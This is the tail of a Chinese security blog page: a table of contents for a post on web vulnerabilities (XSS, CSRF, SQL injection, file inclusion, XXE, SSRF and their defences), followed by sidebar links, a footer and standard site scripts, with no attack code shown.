class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">3.5.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS-X"><span class="toc-number">3.6.</span> <span class="toc-text">DOM型XSS-X</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E5%88%A9%E7%94%A8%EF%BC%88Get%E5%9E%8B%E8%8E%B7%E5%8F%96Cookie%EF%BC%89"><span class="toc-number">3.7.</span> <span class="toc-text">反射型XSS利用（Get型获取Cookie）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">3.7.1.</span> <span class="toc-text">钓鱼原理：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88Post%EF%BC%89"><span class="toc-number">3.8.</span> <span class="toc-text">反射型XSS（Post）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E5%88%A9%E7%94%A8%EF%BC%88Post%E5%9E%8B%E8%8E%B7%E5%8F%96Cookie%EF%BC%89"><span class="toc-number">3.9.</span> <span class="toc-text">反射型XSS利用（Post型获取Cookie）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">3.10.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8BXSS%E5%88%A9%E7%94%A8%EF%BC%88%E9%92%93%E9%B1%BC%EF%BC%89"><span class="toc-number">3.11.</span> <span class="toc-text">DOM型XSS利用（钓鱼）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%88%A9%E7%94%A8%EF%BC%88%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">3.12.</span> <span class="toc-text">存储型XSS利用（键盘记录读取）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%9B%B2%E6%89%93"><span class="toc-number">3.13.</span> <span class="toc-text">XSS盲打</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">3.13.1.</span> <span class="toc-text">概念</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-%E8%BD%AC%E6%8D%A2"><span class="toc-number">3.14.</span> <span class="toc-text">XSS绕过-过滤-转换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-%E7%BC%96%E7%A0%81"><span class="toc-number">3.15.</span> <span class="toc-text">XSS绕过-过滤-编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87-%E5%85%B3%E4%BA%8Ehtmlspecialchars-%E5%87%BD%E6%95%B0"><span class="toc-number">3.16.</span> <span class="toc-text">XSS绕过-关于htmlspecialchars()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%B8%B8%E8%A7%81%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD%EF%BC%88XSS%E4%B9%8Bhref%E5%92%8CJS%E8%BE%93%E5%87%BA%EF%BC%89"><span class="toc-number">3.17.</span> <span class="toc-text">XSS常见防范措施（XSS之href和JS输出）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">4.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF%EF%BC%88Get%E5%9E%8B%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">CSRF（Get型）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-POST%E5%9E%8B"><span class="toc-number">4.3.</span> <span class="toc-text">CSRF(POST型)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token"><span class="toc-number">4.4.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF"><span class="toc-number">4.5.</span> <span class="toc-text">Token如何防止CSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%EF%BC%88sql-inject%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">SQL注入（sql-inject）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">5.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.3.</span> <span class="toc-text">注入点类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88Post%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">数字型注入（Post）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%88Get%EF%BC%89"><span class="toc-number">5.5.</span> <span class="toc-text">字符型注入（Get）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">5.6.</span> <span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">5.7.</span> <span class="toc-text">xx型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-number">5.8.</span> <span class="toc-text">“insert&#x2F;update”注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-number">5.8.1.</span> <span class="toc-text">updatexml 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue%E5%87%BD%E6%95%B0"><span class="toc-number">5.8.2.</span> <span class="toc-text">extractvalue函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor%E5%87%BD%E6%95%B0"><span class="toc-number">5.8.3.</span> <span class="toc-text">floor函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-number">5.9.</span> <span class="toc-text">“delete”注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9Chttp-header%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="toc-number">5.10.</span> <span class="toc-text">“http header”注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-boolean%EF%BC%89"><span class="toc-number">5.11.</span> <span class="toc-text">盲注（base on boolean）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-time%EF%BC%89"><span class="toc-number">5.12.</span> <span class="toc-text">盲注（base on time）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">5.13.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-number">5.14.</span> <span class="toc-text">SQL注入防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.15.</span> <span class="toc-text">RCE(远程命令执行)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exec-%E2%80%98-evel-%E2%80%98"><span class="toc-number">5.15.1.</span> <span class="toc-text">Exec  ‘ evel ‘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Include-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.16.</span> <span class="toc-text">File Include(文件包含漏洞)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">5.16.1.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">5.16.2.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.16.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">5.16.4.</span> <span class="toc-text">常见防范措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%B8%8E%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.17.</span> <span class="toc-text">不安全的文件下载与上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">5.18.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">5.18.1.</span> <span class="toc-text">客户端验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME"><span class="toc-number">5.18.2.</span> <span class="toc-text">MIME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-number">5.18.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">5.19.</span> <span class="toc-text">防范措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">越权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">6.1.</span> <span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">6.2.</span> <span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">7.</span> <span class="toc-text">目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-number">7.1.</span> <span class="toc-text">概述</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">8.</span> <span class="toc-text">敏感文信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-2"><span class="toc-number">8.1.</span> <span class="toc-text">概述</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96serialize"><span class="toc-number">9.1.</span> <span class="toc-text">序列化serialize()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96unserialize"><span class="toc-number">9.2.</span> <span class="toc-text">反序列化unserialize()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-xml-external-entity-injection"><span class="toc-number">10.</span> <span class="toc-text">XXE(xml external entity -injection)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%BC%95%E7%94%A8payload"><span class="toc-number">10.1.</span> <span class="toc-text">外部实体引用payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">10.2.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC"><span class="toc-number">11.</span> <span class="toc-text">不安全的URL跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-3"><span class="toc-number">11.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-number">11.2.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">12.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-4"><span class="toc-number">12.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-2"><span class="toc-number">12.2.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">13.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E9%87%8D%E8%80%8C%E9%81%93%E8%BF%9C"><span class="toc-number">13.1.</span> <span class="toc-text">任重而道远</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/22/drozer%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E6%B5%8B%E8%AF%95/" title="drozer安全测试框架安装与测试"><img src="https://i.loli.net/2021/08/22/RUqfSFolvnXAriM.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="drozer安全测试框架安装与测试"/></a><div class="content"><a class="title" href="/2021/08/22/drozer%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E6%B5%8B%E8%AF%95/" title="drozer安全测试框架安装与测试">drozer安全测试框架安装与测试</a><time datetime="2021-08-22T14:08:30.763Z" title="更新于 2021-08-22 22:08:30">2021-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/26/Web%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E4%B9%8Bpython/" title="Web白帽子学习之python"><img src="https://i.loli.net/2021/05/26/8lZwKsRLpiaeuMg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web白帽子学习之python"/></a><div class="content"><a class="title" href="/2021/05/26/Web%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E4%B9%8Bpython/" title="Web白帽子学习之python">Web白帽子学习之python</a><time datetime="2021-07-21T11:47:46.518Z" title="更新于 2021-07-21 19:47:46">2021-07-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/%E3%80%90%E5%BF%85%E7%9C%8B%E3%80%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/" title="【必读】网络安全法"><img src="https://i.loli.net/2021/06/30/aME6UL9Kito5Ixq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【必读】网络安全法"/></a><div class="content"><a class="title" href="/2021/06/30/%E3%80%90%E5%BF%85%E7%9C%8B%E3%80%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/" title="【必读】网络安全法">【必读】网络安全法</a><time datetime="2021-07-19T14:41:30.226Z" title="更新于 2021-07-19 22:41:30">2021-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/19/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Weblogic10.3.6漏洞复现"><img src="https://i.loli.net/2021/07/19/1G8RfFL9JhYPyTn.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Weblogic10.3.6漏洞复现"/></a><div class="content"><a class="title" href="/2021/07/19/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Weblogic10.3.6漏洞复现">Weblogic10.3.6漏洞复现</a><time datetime="2021-07-19T14:37:08.638Z" title="更新于 2021-07-19 22:37:08">2021-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/26/LinuxDeploy%E5%AE%89%E8%A3%85Centos/" title="Linux Deploy安装Centos"><img src="https://i.loli.net/2021/06/28/85JkjqeviTBGXyY.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux Deploy安装Centos"/></a><div class="content"><a class="title" href="/2021/06/26/LinuxDeploy%E5%AE%89%E8%A3%85Centos/" title="Linux Deploy安装Centos">Linux Deploy安装Centos</a><time datetime="2021-07-19T14:31:37.938Z" title="更新于 2021-07-19 22:31:37">2021-07-19</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2021/01/23/6NfDvmI2c5VesXP.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Shawn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">相见即是缘分，少年！有空常来啊...</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><div class="js-pjax"><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    $.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js', function () {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'default',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'gQCglyv92NlaWrGjAf1ANbbf-MdYXbMMI',
+      appKey: 'VxmLj0u0vjDuqJ5cHMH1w5CT',
+      placeholder: '少年！都到这儿了不留下点什么吗！！',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="https://myhkw.cn/player/js/player.js" id="myhk" key="161172509791" m="1"></script><script>(function(){
+  const bp = document.createElement('script');
+  const curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https'){
+  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  bp.dataset.pjax = ''
+  const s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})()</script></div></body></html>
